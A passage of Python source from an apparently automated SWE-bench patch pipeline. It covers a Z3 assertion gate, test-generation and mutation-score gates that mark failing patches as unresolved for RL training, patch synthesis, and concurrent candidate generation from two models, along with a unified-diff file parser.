            for var_name, sort_name in variables.items():
                sort = sort_map.get(sort_name, z3.IntSort())
                # Emit SMT-LIB2 declare-const for each variable.
                smt_sort = "Int" if sort == z3.IntSort() else "Bool"
                var_decls.append(f"(declare-const {var_name} {smt_sort})")

            for assertion_expr in assertions[:3]:
                smt2 = (
                    "\n".join(var_decls)
                    + f"\n(assert (not {assertion_expr}))\n(check-sat)"
                )
                try:
                    result = z3.parse_smt2_string(smt2)
                    solver = z3.Solver()
                    solver.add(result)
                    if solver.check() == z3.sat:
                        log.warning(
                            f"[z3_gate] {instance_id}: Z3 counterexample for "
                            f"assertion: {assertion_expr[:80]}"
                        )
                        return False
                except Exception as exc:
                    log.debug(
                        f"[z3_gate] {instance_id}: Z3 parse failed for "
                        f"'{assertion_expr[:60]}': {exc}"
                    )
                    continue
        except Exception as exc:
            raise RuntimeError(f"Z3 solver error: {exc}") from exc

        return True

    # ── Test Generation + Mutation Gate (Step 5.5) ──────────────────────────

    async def _run_test_mutation_gate(
        self,
        instance_id: str,
        winner:      BoBNCandidate,
        result:      BoBNResult,
    ) -> BoBNCandidate:
        """
        Generate a test suite for the winning patch and verify mutation score.

        GAP 5 FIX: Previously TestGeneratorAgent and MutationVerifierAgent were
        only called from controller._phase_fix_gap5() AFTER BoBNSampler.sample()
        returned — so the SWE-bench evaluator path had no mutation coverage gate
        at all.  This method wires both agents inline so every call path (evaluator
        and controller) executes the full audit diagram step:
          Formal Gate → Test Generator + Mutation → Commit

        Requires self._storage and self._repo_root to be set at constructor time.
        When either is absent, this method returns the winner unchanged (gate
        skipped, result.*_gate_passed remain None).

        Mutation gate failure does NOT drop the winner.  It marks
        winner.formal_gate_passed=False and result.mutation_gate_passed=False
        so the trajectory collector records the run as unresolved, giving the RL
        training loop correct negative signal without silently discarding the patch.

        Infrastructure failures (mutmut not installed, test generation timeout,
        import errors) are fully non-blocking — they log a warning and return the
        winner unchanged with gate fields set to None.

        Returns
        -------
        The winner BoBNCandidate (possibly with formal_gate_passed=False if the
        mutation gate failed).
        """
        if not self._storage or not self._repo_root:
            log.debug(
                f"[bobn] {instance_id}: test/mutation gate skipped "
                "(storage or repo_root not provided)"
            )
            return winner

        from pathlib import Path

        effective_run_id  = self._run_id or instance_id
        effective_repo    = Path(self._repo_root)

        # ── Step 5.5a: TestGeneratorAgent ─────────────────────────────────────
        # Generate a regression test suite for the winning patch.  The suite
        # covers the functions touched by the patch so MutationVerifier can target
        # them specifically.  Failures here are non-blocking — the mutation step
        # can still proceed using any existing tests in the repo.
        generated_test_paths: list[str] = []
        try:
            from agents.test_generator import TestGeneratorAgent
            from agents.base import AgentConfig

            tg_config = AgentConfig() if not hasattr(self, "_agent_config") else self._agent_config  # type: ignore[attr-defined]

            tg = TestGeneratorAgent(
                storage     = self._storage,
                run_id      = effective_run_id,
                config      = tg_config,
                repo_root   = effective_repo,
                domain_mode = self._domain_mode,
            )

            # BLOCK-02 FIX: FixAttempt has no `issue_id` field (it is `issue_ids: list[str]`)
            # and no `patch` field. Previously these unknown kwargs were silently ignored by
            # Pydantic, producing a stub with issue_ids=[] and no file content, so
            # TestGeneratorAgent and MutationVerifierAgent always received empty stubs.
            from brain.schemas import FixAttempt, FixedFile
            fix_stub = FixAttempt(
                run_id      = effective_run_id,
                issue_ids   = [instance_id],
                gate_passed = True,
                fixed_files = _extract_fixed_files_from_patch(winner.patch),
            )

            tg_results = await tg.run(fix=fix_stub)
            if tg_results:
                generated_test_paths = [
                    str(effective_repo / tf)
                    for tf in (getattr(tg_results, "test_paths", None) or [])
                    if tf
                ]
                log.info(
                    f"[bobn] {instance_id}: TestGenerator produced "
                    f"{len(generated_test_paths)} test file(s)"
                )
            result.test_gate_passed = bool(tg_results)
        except ImportError as exc:
            log.debug(f"[bobn] {instance_id}: TestGeneratorAgent import skipped: {exc}")
            result.test_gate_passed = None
        except Exception as exc:
            log.warning(
                f"[bobn] {instance_id}: TestGeneratorAgent non-fatal error: {exc}"
            )
            result.test_gate_passed = None

        # ── Step 5.5b: MutationVerifierAgent ──────────────────────────────────
        # Verify the generated (+ existing) test suite kills >= threshold% of
        # mutants in the changed functions.  Gate failure marks the winner as
        # unresolved for trajectory collection.
        try:
            from agents.mutation_verifier import MutationVerifierAgent
            from agents.base import AgentConfig

            mv_config = AgentConfig() if not hasattr(self, "_agent_config") else self._agent_config  # type: ignore[attr-defined]

            mv = MutationVerifierAgent(
                storage          = self._storage,
                run_id           = effective_run_id,
                config           = mv_config,
                repo_root        = effective_repo,
                domain_mode      = self._domain_mode,
                score_threshold  = self._mutation_threshold,
            )

            # BLOCK-02 FIX: same correction — use issue_ids=[...] not issue_id=, remove patch=.
            from brain.schemas import FixAttempt
            fix_stub_mv = FixAttempt(
                run_id      = effective_run_id,
                issue_ids   = [instance_id],
                gate_passed = True,
                fixed_files = _extract_fixed_files_from_patch(winner.patch),
            )

            mutation_results = await mv.run(
                fix        = fix_stub_mv,
                test_paths = generated_test_paths or None,
            )

            if mutation_results:
                all_passed = all(r.passed for r in mutation_results)
                result.mutation_gate_passed = all_passed

                scores = ", ".join(
                    f"{r.file_path}:{r.mutation_score:.1f}%"
                    for r in mutation_results
                )
                if all_passed:
                    log.info(
                        f"[bobn] {instance_id}: mutation gate PASSED — {scores}"
                    )
                else:
                    failed = [r for r in mutation_results if not r.passed]
                    log.warning(
                        f"[bobn] {instance_id}: mutation gate FAILED — {scores} "
                        f"({len(failed)} file(s) below threshold)"
                    )
                    # Mark winner as failing formal gate so trajectory collector
                    # labels this run as unresolved — correct RL negative signal.
                    winner.formal_gate_passed = False
            else:
                # mutmut found no Python files to mutate (e.g. pure C patch)
                result.mutation_gate_passed = None
                log.debug(
                    f"[bobn] {instance_id}: mutation gate skipped "
                    "(no mutable Python files in patch)"
                )
        except ImportError as exc:
            log.debug(f"[bobn] {instance_id}: MutationVerifierAgent import skipped: {exc}")
            result.mutation_gate_passed = None
        except Exception as exc:
            log.warning(
                f"[bobn] {instance_id}: MutationVerifierAgent non-fatal error: {exc}"
            )
            result.mutation_gate_passed = None

        return winner

    # ── Synthesis (Step 4.5) ─────────────────────────────────────────────────

    async def _synthesize_winner(
        self,
        instance_id:    str,
        candidates:     list[BoBNCandidate],
        attack_reports: list[CriticAttackReport],
        result:         BoBNResult,
    ) -> BoBNCandidate | None:
        """
        Run PatchSynthesisAgent and resolve to a winning BoBNCandidate.

        Falls back to composite argmax (candidates[0]) if synthesis fails.
        Updates result.synthesis_action for observability.
        """
        if not candidates:
            return None

        try:
            decision = await self._synthesis.synthesize(
                issue_text       = self.issue,
                localization_ctx = self.loc_ctx,
                candidates       = candidates,
                attack_reports   = attack_reports,
            )
        except Exception as exc:
            log.warning(
                f"[bobn] {instance_id}: synthesis raised unexpectedly: {exc} "
                "— using argmax winner"
            )
            result.synthesis_action = "argmax_fallback"
            return candidates[0]

        if decision.fallback:
            log.info(
                f"[bobn] {instance_id}: synthesis fallback "
                f"({decision.fallback_reason}) — using argmax winner"
            )
            result.synthesis_action = "argmax_fallback"
            return candidates[0]

        winner = apply_synthesis_decision(decision, candidates)
        if winner is None:
            result.synthesis_action = "argmax_fallback"
            return candidates[0]

        winner.synthesis_decision = decision
        result.synthesis_action   = decision.action

        if decision.action == "merge":
            log.info(
                f"[bobn] {instance_id}: synthesis produced MERGED patch "
                f"(confidence={decision.confidence:.2f}) — "
                f"{decision.reasoning[:120]}"
            )
        else:
            log.info(
                f"[bobn] {instance_id}: synthesis PICK_BEST "
                f"candidate={decision.winner_id} "
                f"(confidence={decision.confidence:.2f})"
            )

        return winner

    async def _generate_all_candidates(
        self, n_a: int, n_b: int
    ) -> list[BoBNCandidate]:
        """Generate N_A patches from Fixer A and N_B from Fixer B concurrently."""
        temps_a = self.router.fixer_a_temperatures()
        temps_b = self.router.fixer_b_temperatures()
        model_a = self.router.primary_model("fix")
        model_b = self.router.secondary_model()

        tasks: list[Any] = []
        slot_ids: list[tuple[str, str, float]] = []

        for i, temp in enumerate(temps_a[:n_a]):
            cid = f"A{i}"
            tasks.append(self._generate_patch(model_a, temp, f"fixer_a_{i}"))
            slot_ids.append((cid, model_a, temp))

        for i, temp in enumerate(temps_b[:n_b]):
            cid = f"B{i}"
            tasks.append(self._generate_patch(model_b, temp, f"fixer_b_{i}"))
            slot_ids.append((cid, model_b, temp))

        patches = await asyncio.gather(*tasks, return_exceptions=True)

        candidates: list[BoBNCandidate] = []
        for (cid, model, temp), patch_or_err in zip(slot_ids, patches):
            if isinstance(patch_or_err, Exception):
                log.warning(f"[bobn] generation failed for {cid}: {patch_or_err}")
                continue
            if not patch_or_err:
                log.warning(f"[bobn] empty patch for {cid}")
                continue
            candidates.append(BoBNCandidate(
                candidate_id = cid,
                patch        = patch_or_err,
                model        = model,
                temperature  = temp,
                fixer        = "a" if cid.startswith("A") else "b",
            ))

        return candidates

    async def _generate_patch(
        self, model: str, temperature: float, slot: str
    ) -> str:
        """Generate a single patch candidate from the given model and temperature."""
        from swarm.crew_roles import build_swe_bench_crew

        loc_prefix = (
            f"\n\n{self.loc_ctx}\n\n" if self.loc_ctx else ""
        )
        issue_with_loc = f"{loc_prefix}{self.issue}"

        # Try CrewAI crew first (structured multi-step decomposition)
        try:
            crew = build_swe_bench_crew(
                issue_text   = issue_with_loc[:8000],
                repo_context = self.loc_ctx[:3000] if self.loc_ctx else "",
                model_override = model,
                temperature    = temperature,
            )
            if crew:
                patch = await asyncio.to_thread(crew.kickoff)
                if patch:
                    return str(patch)
        except Exception as exc:
            log.debug(f"[bobn] crew failed for slot {slot}: {exc}")

        # Fallback: direct LLM call
        return await self._direct_llm_generate(model, temperature)

    async def _direct_llm_generate(
        self, model: str, temperature: float
    ) -> str:
        """Direct LLM call without CrewAI — fallback patch generator."""
        prompt = (
            f"## Issue\n{self.issue[:3000]}\n\n"
            f"{'## Edit Targets' + chr(10) + self.loc_ctx[:2000] if self.loc_ctx else ''}\n\n"
            "Produce a unified diff patch that resolves the issue. "
            "Output ONLY the diff, starting with '--- ' headers."
        )
        try:
            import litellm
            resp = await litellm.acompletion(
                model       = model,
                messages    = [{"role": "user", "content": prompt}],
                max_tokens  = 4096,
                temperature = temperature,
            )
            return resp.choices[0].message.content or ""
        except Exception as exc:
            log.debug(f"[bobn] direct LLM failed ({model}): {exc}")
            return ""

    async def _run_execution_loops(
        self,
        candidates: list[BoBNCandidate],
        loop:       ExecutionFeedbackLoop,
    ) -> list[BoBNCandidate]:
        """Run all execution loops concurrently."""
        from swe_bench.execution_loop import build_patch_refiner

        async def _run_one(c: BoBNCandidate) -> BoBNCandidate:
            refiner = await build_patch_refiner(
                fix_model    = c.model,
                issue_text   = self.issue,
                localization = self.loc_ctx,
            )
            exec_result = await loop.run(
                candidate_id     = c.candidate_id,
                initial_patch    = c.patch,
                patch_refiner_fn = refiner,
                model_used       = c.model,
                temperature      = c.temperature,
            )
            c.exec_result = exec_result
            c.patch       = exec_result.final_patch  # Use best-refined patch
            c.test_score  = exec_result.best_score
            c.all_passed  = exec_result.all_passed
            c.exec_rounds = len(exec_result.rounds)
            return c

        results = await asyncio.gather(
            *[_run_one(c) for c in candidates],
            return_exceptions=True,
        )
        updated: list[BoBNCandidate] = []
        for r in results:
            if isinstance(r, BoBNCandidate):
                updated.append(r)
            elif isinstance(r, Exception):
                log.warning(f"[bobn] execution loop error: {r}")
        return updated


# ── Module-level helpers ──────────────────────────────────────────────────────

def _extract_fixed_files_from_patch(patch: str) -> list:
    """
    Parse a unified diff and return a list of FixedFile-like objects
    (path + patch slice) for each touched file.

    Used by _run_test_mutation_gate to build the FixAttempt stub that
    TestGeneratorAgent and MutationVerifierAgent require.

    Returns an empty list on any parse failure — callers handle that
    gracefully (the agents skip mutation on files with no content).
    """
    try:
        from brain.schemas import FixedFile
    except ImportError:
        # If brain.schemas is unavailable in the test environment, return a
        # minimal duck-typed substitute so callers still see `.path` attributes.
        class FixedFile:  # type: ignore[no-redef]
            def __init__(self, path: str, patch: str = "") -> None:
                self.path  = path
                self.patch = patch
                self.content: str = ""

    files: list = []
    current_file: str = ""
    current_lines: list[str] = []

    for line in patch.splitlines(keepends=True):
        if line.startswith("--- "):
            # Flush previous file
            if current_file and current_lines:
                files.append(FixedFile(
                    path  = current_file,
                    patch = "".join(current_lines),
                ))
            current_lines = [line]
            # Normalise "--- a/path/to/file" → "path/to/file"
            raw = line[4:].strip()
            if raw.startswith("a/") or raw.startswith("b/"):
                raw = raw[2:]
            current_file = raw if raw != "/dev/null" else ""
        elif current_file:
            current_lines.append(line)

    # Flush last file
    if current_file and current_lines:
        files.append(FixedFile(
            path  = current_file,
            patch = "".join(current_lines),
        ))

    return files
